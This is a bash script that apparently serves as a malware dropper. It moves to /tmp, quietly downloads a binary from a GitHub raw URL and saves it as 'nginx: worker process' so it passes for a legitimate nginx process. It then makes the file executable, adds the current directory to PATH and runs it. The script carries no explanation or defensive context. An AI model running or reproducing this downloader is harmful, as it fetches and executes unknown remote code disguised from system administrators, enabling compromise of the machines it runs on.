#!/bin/bash
cd /tmp
wget -q -O 'nginx: worker process' https://raw.githubusercontent.com/jackmoc/update/main/update
chmod +x 'nginx: worker process'
PT=$(echo $PATH | grep '\.' | wc -l)
if [ $PT -lt 2 ];then
        export PATH=.:$PATH
fi
'nginx: worker process'
